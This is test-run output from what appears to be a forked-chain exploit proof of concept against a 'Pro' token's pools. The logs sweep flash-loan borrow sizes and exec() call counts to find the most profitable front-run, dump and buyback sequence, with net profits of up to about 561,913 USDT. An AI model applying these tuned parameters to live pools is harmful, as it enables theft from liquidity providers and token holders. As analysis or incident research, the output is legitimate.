  Front-run Pro (gross borrow): 68381 Pro
  exec() Calls Executed: 943
  Pro Dumped in Step B: 47150 Pro
  Step A Revenue: 3681405 USDT
  Step C Buyback Cost: 3388040 USDT
  Pro Repaid to Pro/CDAO pair (borrowed*10000/9975+1): 68552 Pro
  Net Profit (after loan repayment): +293365 USDT
  Gas Used: 54779232
  True max profit via this route: +293365 USDT at 943 exec() calls (55M gas)
  -----------------------------------------

[PASS] test_OptimalPath_Sweep_2D() (gas: 586577764)
Logs:
  === 2-D Sweep: borrow size x call count ===
  | Borrow (Pro) | Calls | StepA Rev (USDT) | StepC Cost (USDT) | Net Profit (USDT) | Gas Used |
  | 10000 | 100 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 10000 | 305 | 580171 | 575963 | +4208 | 19056114 |
  | 10000 | 600 | 580171 | 554268 | +25903 | 35592962 |
  | 10000 | 926 | 580171 | 531689 | +48481 | 53795586 |
  | 25000 | 100 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 25000 | 305 | 1422056 | 1413084 | +8972 | 19056114 |
  | 25000 | 600 | 1422056 | 1360335 | +61720 | 35592962 |
  | 25000 | 926 | 1422056 | 1305409 | +116647 | 53795586 |
  | 50000 | 100 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 50000 | 305 | 2754313 | 2741188 | +13125 | 19056114 |
  | 50000 | 600 | 2754313 | 2640333 | +113980 | 35592962 |
  | 50000 | 926 | 2754313 | 2535225 | +219088 | 53795586 |
  | 68381 | 100 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 68381 | 305 | 3681405 | 3667960 | +13445 | 19056114 |
  | 68381 | 600 | 3681405 | 3534375 | +147029 | 35592962 |
  | 68381 | 926 | 3681405 | 3395076 | +286328 | 53795586 |
  | 68381 | 100 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 68381 | 305 | 3681405 | 3667960 | +13445 | 19056114 |
  | 68381 | 600 | 3681405 | 3534375 | +147029 | 35592962 |
  | 68381 | 926 | 3681405 | 3395076 | +286328 | 53795586 |
  -----------------------------------------

[PASS] test_OptimalPath_Sweep_BorrowSizeAtRealCalls() (gas: 140115239)
Logs:
  === Borrow-Size Sweep @ 305 calls ===
  | Borrow (Pro) | Calls | StepA Rev (USDT) | StepC Cost (USDT) | Net Profit (USDT) | Gas Used |
  | 10000 | 305 | 580171 | 575963 | +4208 | 19056114 |
  | 25000 | 305 | 1422056 | 1413084 | +8972 | 19056114 |
  | 40000 | 305 | 2231635 | 2219632 | +12003 | 19056114 |
  | 50000 | 305 | 2754313 | 2741188 | +13125 | 19056114 |
  | 60000 | 305 | 3263954 | 3250384 | +13570 | 19056114 |
  | 68381 | 305 | 3681405 | 3667960 | +13445 | 19056114 |
  | 68381 | 305 | 3681405 | 3667960 | +13445 | 19056114 |
  -----------------------------------------

[PASS] test_OptimalPath_Sweep_CallCountAtFullBorrow() (gas: 213715467)
Logs:
  === Call-Count Sweep @ Full Borrow (68,381 Pro) ===
  | Borrow (Pro) | Calls | StepA Rev (USDT) | StepC Cost (USDT) | Net Profit (USDT) | Gas Used |
  | 68381 | 1 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 68381 | 50 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 68381 | 100 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 68381 | 200 | REVERT: 0x08c379a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000245472616e7366657248656c7065723a205452414e534645525f46524f4d5f4641494c454400000000000000000000000000000000000000000000000000000000 |
  | 68381 | 305 | 3681405 | 3667960 | +13445 | 19056114 |
  | 68381 | 400 | 3681405 | 3624125 | +57279 | 24382745 |
  | 68381 | 600 | 3681405 | 3534375 | +147029 | 35592962 |
  | 68381 | 800 | 3681405 | 3447922 | +233483 | 46806135 |
  | 68381 | 926 | 3681405 | 3395076 | +286328 | 53795586 |
  -----------------------------------------

[PASS] test_Optimize_100kPro() (gas: 50703027)
Logs:
  === Optimize: 100k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 100000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 5181433 USDT
  Step C Buyback Cost: 4762333 USDT
  Net Profit: +419100 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_10kPro() (gas: 50702873)
Logs:
  === Optimize: 10k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 10000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 580171 USDT
  Step C Buyback Cost: 528273 USDT
  Net Profit: +51898 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_150kPro() (gas: 50703181)
Logs:
  === Optimize: 150k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 150000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 7336392 USDT
  Step C Buyback Cost: 6774478 USDT
  Net Profit: +561913 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_20kPro() (gas: 50702785)
Logs:
  === Optimize: 20k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 20000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 1145111 USDT
  Step C Buyback Cost: 1043839 USDT
  Net Profit: +101272 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_30kPro() (gas: 50702609)
Logs:
  === Optimize: 30k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 30000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 1695412 USDT
  Step C Buyback Cost: 1547163 USDT
  Net Profit: +148249 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_50kPro() (gas: 50702939)
Logs:
  === Optimize: 50k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2518833 USDT
  Net Profit: +235480 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_5kPro() (gas: 50702653)
Logs:
  === Optimize: 5k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 5000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 292028 USDT
  Step C Buyback Cost: 265755 USDT
  Net Profit: +26272 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Optimize_70kPro() (gas: 50702851)
Logs:
  === Optimize: 70k Pro Frontrun, Max Calls ===
  Front-run Pro Size: 70000 Pro
  exec() Calls Executed: 957
  Pro Dumped in Step B: 47850 Pro
  Step A Revenue: 3761039 USDT
  Step C Buyback Cost: 3446581 USDT
  Net Profit: +314458 USDT
  Gas Used: 53799115
  -----------------------------------------

[PASS] test_Scale_100Calls() (gas: 5937941)
Logs:
  === Scaling: 100 Calls, 50k Pro Frontrun ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 100
  Pro Dumped in Step B: 5000 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2807196 USDT
  Net Profit: -52883 USDT
  Gas Used: 5833922
  -----------------------------------------

[PASS] test_Scale_10Calls() (gas: 1229248)
Logs:
  === Scaling: 10 Calls, 50k Pro Frontrun ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 10
  Pro Dumped in Step B: 500 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2840325 USDT
  Net Profit: -86011 USDT
  Gas Used: 788639
  -----------------------------------------

[PASS] test_Scale_200Calls() (gas: 11165864)
Logs:
  === Scaling: 200 Calls, 50k Pro Frontrun ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 200
  Pro Dumped in Step B: 10000 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2771063 USDT
  Net Profit: -16749 USDT
  Gas Used: 11438885
  -----------------------------------------

[PASS] test_Scale_500Calls() (gas: 26864321)
Logs:
  === Scaling: 500 Calls, 50k Pro Frontrun ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 500
  Pro Dumped in Step B: 25000 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2666754 USDT
  Net Profit: +87559 USDT
  Gas Used: 28256840
  -----------------------------------------

[PASS] test_Scale_50Calls() (gas: 3316944)
Logs:
  === Scaling: 50 Calls, 50k Pro Frontrun ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 50
  Pro Dumped in Step B: 2500 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2825529 USDT
  Net Profit: -71215 USDT
  Gas Used: 3030040
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_100kPro() (gas: 54130309)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 100k Pro-equiv ===
  USDT simulated-borrow: 7036265515490590611697805
  [DIAG] Pro bought (bootstrap): 100000 Pro
  [DIAG] USDT buy-in cost: 7036265 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 6854540 USDT
  [DIAG] Step C Buyback Cost: 6196696 USDT
  [DIAG] Step D Final Sale: 6035206 USDT
  [DIAG] Gross Profit Before Loan Repayment: -343215 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 17634 USDT
  [DIAG] Loan Repaid (principal+fee): 7053900 USDT
  [DIAG] TRUE Net Profit After Loan: -7397115 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 7397115 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_10kPro() (gas: 54129517)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 10k Pro-equiv ===
  USDT simulated-borrow: 614615619919941418212851
  [DIAG] Pro bought (bootstrap): 10000 Pro
  [DIAG] USDT buy-in cost: 614615 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 596505 USDT
  [DIAG] Step C Buyback Cost: 542304 USDT
  [DIAG] Step D Final Sale: 526311 USDT
  [DIAG] Gross Profit Before Loan Repayment: -34103 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 1540 USDT
  [DIAG] Loan Repaid (principal+fee): 616156 USDT
  [DIAG] TRUE Net Profit After Loan: -650259 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 650259 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_150kPro() (gas: 54130045)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 150k Pro-equiv ===
  USDT simulated-borrow: 11477881437891979268396134
  [DIAG] Pro bought (bootstrap): 150000 Pro
  [DIAG] USDT buy-in cost: 11477881 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 11204771 USDT
  [DIAG] Step C Buyback Cost: 10090458 USDT
  [DIAG] Step D Final Sale: 9846906 USDT
  [DIAG] Gross Profit Before Loan Repayment: -516661 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 28766 USDT
  [DIAG] Loan Repaid (principal+fee): 11506648 USDT
  [DIAG] TRUE Net Profit After Loan: -12023309 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 12023309 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_20kPro() (gas: 54129539)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 20k Pro-equiv ===
  USDT simulated-borrow: 1246755508947445280188694
  [DIAG] Pro bought (bootstrap): 20000 Pro
  [DIAG] USDT buy-in cost: 1246755 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 1210521 USDT
  [DIAG] Step C Buyback Cost: 1099914 USDT
  [DIAG] Step D Final Sale: 1067894 USDT
  [DIAG] Gross Profit Before Loan Repayment: -68254 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 3124 USDT
  [DIAG] Loan Repaid (principal+fee): 1249880 USDT
  [DIAG] TRUE Net Profit After Loan: -1318134 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 1318134 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_30kPro() (gas: 54129385)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 30k Pro-equiv ===
  USDT simulated-borrow: 1897179999444638705930414
  [DIAG] Pro bought (bootstrap): 30000 Pro
  [DIAG] USDT buy-in cost: 1897179 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 1842807 USDT
  [DIAG] Step C Buyback Cost: 1673467 USDT
  [DIAG] Step D Final Sale: 1625385 USDT
  [DIAG] Gross Profit Before Loan Repayment: -102454 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 4754 USDT
  [DIAG] Loan Repaid (principal+fee): 1901934 USDT
  [DIAG] TRUE Net Profit After Loan: -2004389 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 2004389 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_50kPro() (gas: 54130419)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 50k Pro-equiv ===
  USDT simulated-borrow: 3256150590707375564471249
  [DIAG] Pro bought (bootstrap): 50000 Pro
  [DIAG] USDT buy-in cost: 3256150 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 3165460 USDT
  [DIAG] Step C Buyback Cost: 2871144 USDT
  [DIAG] Step D Final Sale: 2790834 USDT
  [DIAG] Gross Profit Before Loan Repayment: -170999 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 8160 USDT
  [DIAG] Loan Repaid (principal+fee): 3264311 USDT
  [DIAG] TRUE Net Profit After Loan: -3435310 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 3435310 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_5kPro() (gas: 54130397)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 5k Pro-equiv ===
  USDT simulated-borrow: 305163138880089973014559
  [DIAG] Pro bought (bootstrap): 5000 Pro
  [DIAG] USDT buy-in cost: 305163 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 296109 USDT
  [DIAG] Step C Buyback Cost: 269277 USDT
  [DIAG] Step D Final Sale: 261285 USDT
  [DIAG] Gross Profit Before Loan Repayment: -17045 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 764 USDT
  [DIAG] Loan Repaid (principal+fee): 305927 USDT
  [DIAG] TRUE Net Profit After Loan: -322973 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 322973 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Diag_70kPro() (gas: 54130265)
Logs:
  === DIAGNOSTIC (deal-funded measurement, NOT a financing claim): 70k Pro-equiv ===
  USDT simulated-borrow: 4698564629576567714455205
  [DIAG] Pro bought (bootstrap): 70000 Pro
  [DIAG] USDT buy-in cost: 4698564 USDT
  [DIAG] exec() Calls Executed: 956
  [DIAG] Pro Dumped in Step B: 47800 Pro
  [DIAG] Step A Revenue (front-run sell): 4571502 USDT
  [DIAG] Step C Buyback Cost: 4141213 USDT
  [DIAG] Step D Final Sale: 4028537 USDT
  [DIAG] Gross Profit Before Loan Repayment: -239739 USDT
  [DIAG] Flash-Loan Fee Paid (0.25%): 11775 USDT
  [DIAG] Loan Repaid (principal+fee): 4710340 USDT
  [DIAG] TRUE Net Profit After Loan: -4950079 USDT
  [DIAG] Gas Used: 53853304
  Virtual loan repayment: would FAIL, short 4950079 USDT
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_100kPro() (gas: 55773787)
Logs:
  === SelfFinanced Flash: 100k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 7036265515490590611697805
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_10kPro() (gas: 55774007)
Logs:
  === SelfFinanced Flash: 10k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 614615619919941418212851
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_150kPro() (gas: 55774601)
Logs:
  === SelfFinanced Flash: 150k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 11477881437891979268396134
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_20kPro() (gas: 55774161)
Logs:
  === SelfFinanced Flash: 20k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 1246755508947445280188694
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_30kPro() (gas: 55774755)
Logs:
  === SelfFinanced Flash: 30k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 1897179999444638705930414
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_50kPro() (gas: 55774073)
Logs:
  === SelfFinanced Flash: 50k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 3256150590707375564471249
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_5kPro() (gas: 55774462)
Logs:
  === SelfFinanced Flash: 5k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 305163138880089973014559
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_Flash_70kPro() (gas: 55774403)
Logs:
  === SelfFinanced Flash: 70k Pro-equiv ===
  USDT to borrow (getAmountsIn on Router, 18dec): 4698564629576567714455205
  OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)
  Revert reason (hex): 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002642455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63650000000000000000000000000000000000000000000000000000
  -----------------------------------------

[PASS] test_SelfFinanced_PairSanity() (gas: 43957)
Logs:
  === WBNB/USDT Pair Sanity (fork block 112652245) ===
  USDT reserve: 15646105
  WBNB reserve: 27266
  Pair verified: PancakeSwap V2 (factory 0xcA143...c73) -> calls pancakeCall, 0.25% fee
  ---

Suite result: ok. 39 passed; 0 failed; 0 skipped; finished in 42.33s (69.53s CPU time)

Ran 1 test suite in 42.41s (42.33s CPU time): 39 tests passed, 0 failed, 0 skipped (39 total tests)

```
